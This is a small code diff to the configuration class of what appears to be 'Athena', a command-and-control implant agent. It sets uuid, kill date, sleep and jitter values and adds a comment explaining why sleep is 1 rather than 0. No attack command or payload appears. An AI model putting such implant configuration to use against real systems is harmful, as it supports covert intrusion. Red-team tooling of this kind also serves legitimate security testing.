@@ -53,7 +53,7 @@ namespace Athena.Config
             this.uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = 1;
+            int sleep = 1; //A 0 sleep causes issues with messaging, so setting it to 1 to help mitigate those issues
             this.sleep = sleep;
             int jitter = 0;
             this.jitter = jitter;
